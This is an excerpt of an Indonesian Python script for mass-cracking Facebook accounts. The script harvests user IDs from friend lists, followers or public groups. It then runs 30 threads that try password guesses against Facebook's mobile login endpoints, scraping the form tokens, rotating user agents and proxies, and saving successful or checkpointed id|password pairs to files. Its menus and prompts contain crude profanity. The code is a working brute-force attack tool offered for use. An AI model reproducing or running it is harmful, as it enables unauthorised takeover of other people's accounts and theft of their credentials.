...
\t|_______/[___]   \'-;__/[_____][_____]'.__.'[___]    	
			{m}•{k}•{h}•{sir} Author : Alvino_Adijaya | Basari_ID {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		print(f'  {x}[{h}•{x}]{h} LOGIN GAGAL!!--> WKWI CANDA NGAB[JALANKAN ULANG]!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	cetak(nel('\tSelamat Datang [green]%s[white] Ganteng'%(my_name)))
	alvino_xy(f'>> Your Idz : '+str(my_id))
	alvino_xy(f'>> Your Ip  : {ip}')
	print('')
	print('1. Crack Dari ID Pertemanan Publik ')
	print('2. Crack Dari ID Followers ')
	print('3. Crack Dari ID Group Publik   ')
	###print('>> 4. Crack File	')
	###print('>> 5. Hasil Crack  ')
	print('0. Keluar  Ngecrot     ')
...
def dump_massal():
	...
	try:
		...
		print('--> Masukkan Angka Anjing, Malah Huruff Goblok Ngentod')
		exit()
	if jum<1 or jum>100:
...
#		taplikasi.append('no')
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[yellow]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[red] moms,and,soon[white] '))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'->>>> {m}•{k}•{h}•{x} Agar Mendapatkan Hasil Ijo Comly Terlebih Dahulu {m}•{k}•{h}•{x} <<<<- ')
	print('')
	print(f'--> Hasil {h}OK{x} Tidak Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'--> Hasil {k}CP{x} Tidak Tersimpan Di : {k}CP/%s {x}'%(cpc))
	print(f' ')
	print(f'--> Mainkan Mode Pesawat Jika Tidak Ada {m}Hasil{x} ><\n')
	print(f' ')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]><[green] Crack Selesai Cok , Tetap Bersyukur Apapun Hasilnya [cyan] ><[white] '))
	print(f'[{b}•{x}]{h} HASIL OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} HASIL CP : {k}%s{x} '%(cp))
	print('')
	print('[•] Lanjut Comly ( Y/t ) ? ')
	woi = input('>> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}><{k} Good Bye Dadaa Sayang{x} >< ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r1️⃣ {P}[{b}{loop}{P}/{u}{len(id)}{P}]⚔️{P}[{H}{ok}{P}]⚔️{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r🔥 {P}[{asu}💥{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]💥{P}[{H}{ok}{P}]💥{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			p = ses.get('https://mobile.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mobile.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			...
			po = ses.post('https://mobile.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}BAZ --> {idf}|{pw}{N}')     
				###os.popen('play-audio .cp.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
